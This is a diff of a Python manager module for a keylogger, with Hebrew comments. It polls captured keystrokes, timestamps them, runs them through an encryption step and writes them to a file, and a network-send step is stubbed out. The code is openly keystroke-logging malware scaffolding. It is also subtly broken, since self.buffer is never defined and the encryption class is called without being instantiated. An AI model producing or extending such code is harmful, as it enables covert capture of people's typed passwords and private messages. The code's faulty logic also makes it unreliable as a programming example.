@@ -1,14 +1,16 @@
-import time,datetime ,ctypes,threading
-from kyllog import MeinKeylogger
+import time, datetime, ctypes, threading
+from key_logger import KeyLogger
 from FileWriter import FileWriter
+from encryption import Encryption
 
 
 class Manager:
 
-    def __init__(self,time):
+    def __init__(self, time):
         self.time = time
-        self.keylogger = MeinKeylogger()
+        self.keylogger = KeyLogger()
         self.file_writer = FileWriter()
+        self.encryption = Encryption
         self.running = False
 
     def collect_keys(self):
@@ -17,21 +19,18 @@ class Manager:
                 time.sleep(self.time)
                 logged_keys = self.keylogger.get_logged_keys()
                 if logged_keys:
-                    timestamp = datetime.datetime.now().strftime("%d/%m/%Y %H:%M:%S")
-                    data = {timestamp:logged_keys}
-                    #הצפנה
-                    # encrypted_data = Encryptor.encrypt(data)
-                    #מישהו צריך לעשות פונקציית הצפנה
-
-                    #שליחה לקובץ
-                    self.file_writer.Writes_to_file(data)
-
-                    #שליחה לרשת
+                    timestamp = datetime.datetime.now().strftime("%d/%m/%Y %H:%M")
+                    data = {timestamp: logged_keys}
+                    # הצפנה
+                    encrypted_data = self.encryption(data)
+                    # שליחה לקובץ
+                    self.file_writer.Writes_to_file(encrypted_data)
+                    # שליחה לרשת
                     if self.file_writer.Writes_to_network:
                         # self.network_writer.send(encrypted_data)
                         pass
 
-                    #ניקוי
+                    # ניקוי
                     self.buffer.clear()
             except Exception as e:
                 print(f"Error collecting keystrokes: {e}")
@@ -46,40 +45,7 @@ class Manager:
         self.running = False
         self.keylogger.stop_logging()
 
+
 if __name__ == '__main__':
     a = Manager(50)
     a.start()
-
-
-
-    # def time_manager(self):
-    #     self.time_man = datetime.datetime.fromtimestamp(self.logger.time).strftime(keylogger_manager.current_time)
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
